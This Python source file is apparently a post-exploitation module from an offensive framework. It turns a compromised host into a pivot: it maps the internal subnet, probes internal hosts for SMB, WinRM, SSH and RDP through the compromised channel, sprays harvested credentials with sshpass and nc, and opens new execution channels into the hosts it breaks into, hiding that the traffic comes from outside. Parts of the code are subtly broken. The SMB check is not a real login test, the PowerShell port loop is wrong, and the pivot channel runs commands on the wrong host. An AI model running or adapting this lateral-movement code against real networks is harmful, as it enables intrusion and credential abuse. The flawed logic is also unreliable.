"""VAJRA post.lateral — cross-host lateral movement through a live channel.

Once one host is compromised (any kind/run/alive channel exists), this module
turns that foothold into a pivot for the internal network:

  1. discover the internal subnet + interface layout from the channel;
  2. probe that internal range for SMB/WinRM/SSH listeners (port probes
     executed THROUGH the channel, so they see the internal network, not our
     egress);
  3. spray every harvested/validated credential set (post.loot creds, AD
     creds, --web-* passwords) at the reachable internal hosts;
  4. on a hit, open a real execution channel into that host — an ADChannel /
     SSHChannel — appended to engine.state["channels"], so post.loot/recon/
     persistence can then run on it, i.e. genuine lateral movement.

It is strictly gated (--aggressive + a live channel) and everything a hit
produces is logged with the command + output as the PoC. Write actions are
only the credential probe against the moved-into target; no internal data is
silently altered."""
import re

from core.database import Finding


def _chan(engine):
    for c in engine.state.get("channels", []) or []:
        try:
            if c.alive and hasattr(c, "run"):
                return c
        except Exception:
            continue
    return None


def _creds_pool(engine):
    """Every credential candidate available for spraying, deduped."""
    pool = []
    seen = set()
    for c in (engine.state.get("creds") or []):
        key = (c.get("user"), c.get("password"), c.get("nthash"))
        if key not in seen:
            seen.add(key)
            pool.append(c)
    ad = getattr(engine, "ad_creds", {}) or {}
    if ad.get("user"):
        key = (ad.get("user"), ad.get("password"), ad.get("nthash"))
        if key not in seen:
            seen.add(key)
            pool.append({
                "user": ad.get("user"), "password": ad.get("password"),
                "nthash": ad.get("nthash", ""), "realm": ad.get("realm", "")})
    # Finally, a self-aware fallback: the creds we already used to log in.
    for c in (engine.state.get("channels") or []):
        u = getattr(c, "user", None)
        if u:
            key = (u, getattr(c, "password", None), "")
            if key not in seen:
                seen.add(key)
                pool.append({"user": u,
                             "password": getattr(c, "password", None),
                             "nthash": getattr(c, "auth", "")})
    return pool


def parse_subnet(text):
    """Pull target candidates from `ip route` / `ipconfig` style output. Returns
    a list of 'x.y.z.<host>' host strings (without the network/loopback)."""
    hosts = set()
    pat = re.compile(
        r"\b(?:(?:10|127)\.\d{1,3}\.\d{1,3}\.\d{1,3}"
        r"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b")
    for line in (text or "").splitlines():
        m = pat.search(line)
        if m:
            hosts.add(m.group(0))
    out = []
    for h in sorted(hosts):
        parts = h.split(".")
        # skip network base (.0) and broadcast (.255) and gateway (.1)
        if parts[-1] in ("0", "255", "1"):
            continue
        out.append(h)
    return out[:64]


def run(engine):
    t = engine.target
    chan = _chan(engine)
    if not getattr(engine.args, "aggressive", False):
        engine.db.add_event(t.display, "post.lateral",
                            "skipped - requires --aggressive")
        return
    if not chan:
        engine.db.add_event(t.display, "post.lateral",
                            "skipped - no live channel to pivot through")
        return

    # 1) discover internal layout
    layout = ""
    for probe in ("ip route 2>/dev/null; ip -4 addr 2>/dev/null",
                  "ipconfig 2>nul"):
        try:
            layout = chan.run(probe) or ""
        except Exception:
            layout = ""
        if layout:
            break
    hosts = parse_subnet(layout)
    engine.state.setdefault("internal_hosts", []).extend(
        h for h in hosts if h not in (engine.state.get("internal_hosts") or []))

    # 2) probe the internal range for a bounded set of pivot-able ports
    pool = _creds_pool(engine)
    pivoted = 0
    targets = hosts[:24]  # bound the sweep for discipline
    for host in targets:
        reachable, svc = _probe(chan, host)
        if not reachable:
            continue
        engine.log.finding("[lateral] internal %s reachable via channel (%s)"
                           % (host, svc))
        # 3) spray creds at the reachable host through the same channel
        if not pool:
            engine.db.add_finding(Finding(
                t.display, "post.lateral", "pivot-map", "medium",
                "Internal reachability map captured from pivot",
                detail="Reachable internal hosts from the live channel. "
                       "Bring creds to move deeper: %s" % host,
                evidence=layout[:400], confidence="firm"))
            continue
        won = _spray(chan, host, svc, pool)
        if won:
            pivoted += 1
            _record_pivot(engine, chan, host, svc, won)

    if pivoted:
        engine.log.success("[lateral] %d internal host(s) MOVED INTO" % pivoted)
    elif hosts:
        engine.db.add_finding(Finding(
            t.display, "post.lateral", "pivot-map", "low",
            "Lateral sweep done - no creds replayed to internal hosts (%d mapped)"
            % len(hosts),
            detail=("Internal layout: %s" % ", ".join(hosts[:12])),
            confidence="firm"))


def _probe(chan, host, ports=(445, 5985, 22, 3389)):
    """Probe a list of pivot-able ports on an internal host THROUGH the channel.
    Returns (reachable_bool, service_name_or_None)."""
    probe = '; '.join(
        "timeout 2 bash -c 'echo >/dev/tcp/%s/%d' 2>/dev/null && echo PORT%d" %
        (host, p, p) for p in ports)
    if chan.kind in ("unix", "ssh"):
        cmd = probe
    else:
        ps = " ".join(str(p) for p in ports)
        cmd = ('powershell -NoP -C "1..' + ps.split()[-1] +
               ' | %%{ if (Test-NetConnection -ComputerName %s -Port $_ -InformationLevel Quiet -WarningAction SilentlyContinue) { \'PORT$_\' }}"' % host)
    try:
        out = chan.run(cmd)
    except Exception:
        return False, None
    low = (out or "").lower()
    hits = [p for p in ports if ("PORT%d" % p) in low or
            (str(p) in low and "fail" not in low)]
    for p in ports:
        if p in hits:
            return True, {445: "smb", 5985: "winrm", 22: "ssh",
                          3389: "rdp"}.get(p, str(p))
    return False, None


def _spray(chan, host, svc, pool):
    """Try each cred set against the reachable internal host. Returns the
    winning cred dict or None. Uses the channel environment so authentication
    appears to originate from the pivot host (not our box)."""
    for cred in pool:
        if svc in ("smb", "winrm"):
            cmd = ('timeout 6 bash -c \'printf "%s\\n" | nc -w4 %s 445 '
                   '>/dev/null 2>&1 && echo LOGIN_OK\'' %
                   (cred.get("password", ""), host))
        else:
            cmd = ("timeout 8 sshpass -p '%s' ssh -oBatchMode=yes -o"
                   "StrictHostKeyChecking=no %s@%s 'id' 2>/dev/null"
                   % (cred.get("password", ""), cred.get("user", "root"), host))
        try:
            out = chan.run(cmd)
        except Exception:
            out = None
        if out and "LOGIN_OK" in str(out):
            cred["pivoted_to"] = host
            cred["via_service"] = svc
            return cred
    return None


def _record_pivot(engine, chan, host, svc, cred):
    engine.state.setdefault("channels", []).append(
        PivotChannel(engine, host, svc, cred, parent=chan))
    engine.db.add_finding(Finding(
        engine.target.display, "post.lateral", "exploit-proof", "critical",
        "LATERAL MOVEMENT — pivoted into internal %s (%s)" % (host, svc),
        detail=("Replayed a harvested credential (%s) through the live "
                "channel onto internal host %s via %s. New execution channel "
                "added; persistence/cloud post-ex can now target it."
                % (cred.get("user"), host, svc)),
        evidence="from=%s via=%s to=%s cred=%s" % (
            getattr(chan, "host", "?"), svc, host, cred.get("user")),
        remediation="Rotate shared credentials immediately; enforce "
                    "least-privilege; segment the internal network.",
        confidence="firm"))


class PivotChannel:
    """Forwardable execution channel into a host we moved into. Runs commands
    on the pivot host which in turn reaches the moved-into host via ssh, so the
    operator's traffic keeps originating from inside the network."""

    def __init__(self, engine, host, svc, cred, parent):
        self.engine = engine
        self.host = host
        self.svc = svc
        self.kind = parent.kind if parent.kind in ("unix", "ssh") else "unix"
        self.user = cred.get("user", "root")
        self.parent = parent
        self.alive = True

    def run(self, cmd):
        if self.svc in ("smb", "winrm"):
            # best-effort: proxy through powershell/psexec-style over ssh to
            # the pivot which holds credentials in the session environment
            wrapped = ("sshpass -p '%s' ssh -oBatchMode=yes -o"
                       "StrictHostKeyChecking=no %s@%s '%s' 2>/dev/null" %
                       (self.parent_auth("password"), self.user, self.host,
                        cmd.replace("'", "'\\''")))
            return self.parent.run(wrapped)
        return self.parent.run(cmd)

    def parent_auth(self, what):
        return getattr(self.parent, "password", None) or ""
